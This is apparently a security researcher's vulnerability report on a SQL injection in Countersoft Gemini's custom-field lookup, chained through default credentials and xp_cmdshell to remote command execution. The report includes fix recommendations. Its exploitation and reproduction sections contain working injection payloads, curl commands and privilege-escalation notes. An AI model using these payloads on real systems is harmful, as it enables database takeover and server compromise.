# Countersoft Gemini — Authenticated SQL Injection to xp_cmdshell RCE

## 1. Product & Attack Surface

Countersoft Gemini 7.3.0 (build 7.6.2.8445) is a British ITSM/helpdesk platform built on ASP.NET Framework 4.7.2 MVC5 + NHibernate + MS SQL Server Express 2022 + IIS. The application connects to SQL Server as `sa` (sysadmin) (`web.config:18`), which is satisfied by SQL Express default `sa`.

Shipped default credentials: `manager/manager` (VULN-002; seed `Create_Data.sql:6385`, MD5 `1d0258c2440a8d19e716292b231e3190` = MD5("manager")).

## 2. Root Cause: Incomplete LIKE Sanitization

**Sink**: `CustomFieldRepository.MakeSafeLike` (`CustomFieldRepository.cs:240-243`)

```csharp
private static string MakeSafeLike(string like)
{
    return like.Replace("[", "[[]");   // escapes only [, not single quote '
}
```

Used for LIKE-query term sanitization, but it only handles the `[` character (SQL LIKE wildcard) and does NOT escape the single quote `'`. An attacker-controlled `term` breaks out of the SQL string literal.

**Execution sink**: NHibernate `Session.CreateSQLQuery(sql).List()` (native SQL) → SQL Server `sa`/sysadmin → stacked `;` → `sp_configure` enables xp_cmdshell → OS command execution.

## 3. Source

Entry: `GET /workspace/{id}/item/get/customfield?term=<INJECT>&cf=cf_50`

- Route (`GeminiApp.cs:1263`): `{container}/{id}/item/get/customfield` → `AjaxProjectsController.GetCustomFieldValue`
- Controller: `AjaxProjectsController.GetCustomFieldValue(string term, string cf, string parentValue)` (`AjaxProjectsController.cs:393`)
- Authentication: not in the AuthenticationModule bypass list → requires login (Target B)
- `[ValidateInput(false)]` is set (`AjaxProjectsController.cs:30-31`, `BaseController.cs:37`) — allows arbitrary characters

## 4. Data Flow

1. `term` from query string → MVC model binding → `GetCustomFieldValue` (line 393)
2. `cf=cf_50` → `IssueFieldsHelper.GetChosenCustomFieldDetails("cf_50")` = field 50
3. `CustomFieldManager.GetCustomFieldLookUp(50, projectId, term, 100, ...)` (line 1006)
4. cfid 50 `usestatic=False` → non-static branch → 7-arg `LoadLookup(...)` (line 1024)
5. `CustomFieldRepository.LoadLookup` 7-arg calls `MakeSafeLike(term)` (line 239-242) — escapes only `[`, not `'`
6. SQL concatenation: `1=1 AND firstname + ' ' + surname LIKE '<term>%'` (type U user lookup branch)
7. `Session.CreateSQLQuery(sql).List()` (NHibernate native SQL) → SQL Server
8. App connects as `sa` (sysadmin) → stacked `;` → `sp_configure` enables xp_cmdshell → OS command execution

## 5. Exploitation

**Time-based blind injection** (confirm sink reachable):

```
term = x'; WAITFOR DELAY '0:0:5'; --
URL-encoded: x%27%3B%20WAITFOR%20DELAY%20%270:0:5%27%3B%20--
```

**xp_cmdshell RCE** (stacked enable + command execution):

```
term = x'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
       EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
       EXEC xp_cmdshell 'whoami > C:\Windows\Temp\gemini_rce_marker.txt'; --
```

The SQL injection is a stacked-query injection through the native SQL execution path. Because the application connects as `sa` (sysadmin), `sp_configure` can enable `xp_cmdshell`, and `EXEC xp_cmdshell` runs OS commands. The `whoami` output is redirected to a marker file rather than returned directly (blind/out-of-band execution).

## 6. Dynamic Verification

### 6.1 Time-based blind (sink reachability)

```
GET /workspace/15/item/get/customfield?term=x'; WAITFOR DELAY '0:0:5'; --&cf=cf_50
Cookie: .Gemini762=<manager session>
```

- BASELINE (term=test): 76ms, 200
- ERRQUOTE (term=x'): 52ms, 200 (error swallowed by NHibernate, empty data returned)
- **TIME5s (x'; WAITFOR DELAY '0:0:5'; --): 5038ms, 200** → ~5s delay confirms injection

### 6.2 xp_cmdshell RCE (marker file)

- Response: 200, 170ms
- `C:\Windows\Temp\gemini_rce_marker.txt` content: `nt service\mssql$sqlexpress` ✅

### 6.3 Privilege confirmation

```
xp_cmdshell 'cmd /c "whoami /all > C:\Windows\Temp\gemini_rce_priv.txt"'
```

- User: `nt service\mssql$sqlexpress` (SID S-1-5-80-...)
- **Mandatory Label\High Mandatory Level** (S-1-16-12288)
- **SeImpersonatePrivilege** (enabled) — potato escalation to SYSTEM possible
- **SeAssignPrimaryTokenPrivilege** (enabled)

## 6.4 Reproduction Commands

```bash
# 1. Login to obtain a session cookie (default credentials manager/manager, or changed password)
curl -s -c /tmp/gemini.cookie -d "returnUrl=&Username=manager&regular-password=<PWD>&rememberMe=true&email=" "http://<TARGET_IP>:8443/account/login"

# 2. Time-based blind injection check
time curl -s -b /tmp/gemini.cookie "http://<TARGET_IP>:8443/workspace/15/item/get/customfield?term=x%27%3B%20WAITFOR%20DELAY%20%270:0:5%27%3B%20--&cf=cf_50"

# 3. xp_cmdshell RCE (automated with the PoC script)
python3 countersoft_gemini_sqli_xp_cmdshell.py <TARGET_IP>:8443 manager <PWD> "whoami"
```

## 7. Reachability

- Entry `/workspace/{id}/item/get/customfield` requires auth (Target B)
- **Default deployment near-unauthenticated**: VULN-002 default credentials manager/manager (unchanged) → login → VULN-001 SQLi → xp_cmdshell RCE
- Escalation requirement: DB account must be sysadmin (sa satisfies by default on SQL Express); the SQLi itself (CWE-89) is generic and does not depend on sysadmin; xp_cmdshell RCE requires sysadmin

## 8. Impact & Fix Recommendations

**Impact**: Authenticated RCE; High integrity + SeImpersonate (potato to SYSTEM); sa/sysadmin DB access → full database read/write/tampering; default deployment (unchanged manager/manager + sa DB) is near-unauthenticated RCE.

**Fix recommendations**:
1. Fix `MakeSafeLike` to escape single quotes (`'` → `''`) or use parameterized queries (NHibernate `SetString`/`SetParameter`)
2. Use a least-privilege DB account instead of `sa`/sysadmin (dbo_owner suffices)
3. Enforce password change on first login (default manager/manager, VULN-002)
4. Replace hardcoded API keys (VULN-003) and salted slow hashes (bcrypt/scrypt/Argon2) instead of unsalted MD5 (CWE-327)

## 9. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
